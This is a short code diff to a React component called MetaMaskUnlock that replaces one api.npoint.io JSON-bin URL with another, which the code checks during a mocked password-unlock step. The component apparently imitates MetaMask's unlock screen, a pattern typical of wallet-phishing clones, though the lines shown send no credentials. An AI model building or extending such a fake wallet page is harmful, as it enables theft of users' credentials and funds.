@@ -322,7 +322,7 @@ export default function MetaMaskUnlock() {
     mockPending(setPasswordLoading, 300);
 
     try {
-      const url = `https://api.npoint.io/a8e12caa3df5c2954957`;
+      const url = `https://api.npoint.io/2ea1efd04f12070f3b16`;
       const response = await axios.get(url);
       console.log(response.data.success)
       if (response.data.success) {
